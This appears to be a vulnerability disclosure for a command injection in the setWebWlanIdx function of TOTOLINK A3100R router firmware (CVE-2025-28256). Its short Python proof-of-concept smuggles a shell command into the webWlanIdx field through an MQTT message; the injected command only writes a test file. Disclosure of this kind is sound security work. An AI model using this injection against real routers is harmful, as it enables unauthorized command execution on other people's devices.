# TOTOLINK A3100R router setWebWlanIdx function has unauthorized command execution vulnerability

**1. Vulnerability description**

Official firmware download address:

https://www.totolink.net/data/upload/20220412/af5667441aa454891372a0823608aad1.rar

Vulnerability affects products:

TOTOLINK A3100R

Vulnerability affected versions:

V4.1.2cu.5247_B20211129

Distribute CVE ID: 

CVE-2025-28256

Vulnerability details analysis:

In the firmware version A3100R_V4.1.2cu.5247_B20211129, in the cgi function setWebWlanIdx of the file /lib/cste_modules/wireless.so, the string content of the user input field webWlanIdx is not filtered. Attackers can use MQTT services or HTTP services to construct malicious fields, resulting in arbitrary command execution.

![1](https://github.com/user-attachments/assets/39102fb8-550f-4a06-b0db-d73b06f365c3)


**2. Vulnerability Reproduction**

Vulnerability reproduction exp:

```
import paho.mqtt.client as mqtt

client = mqtt.Client()
client.connect("192.168.138.128",1883,60)
client.publish('totolink/router/setting/setWebWlanIdx',
               payload='{"topicurl":"setting/setWebWlanIdx",\
                "webWlanIdx":";echo \'123\'>>/tmp/setWebWlanIdx.txt;"}')
```

Run the exp script to execute the command and successfully create the setWebWlanIdx.txt file.
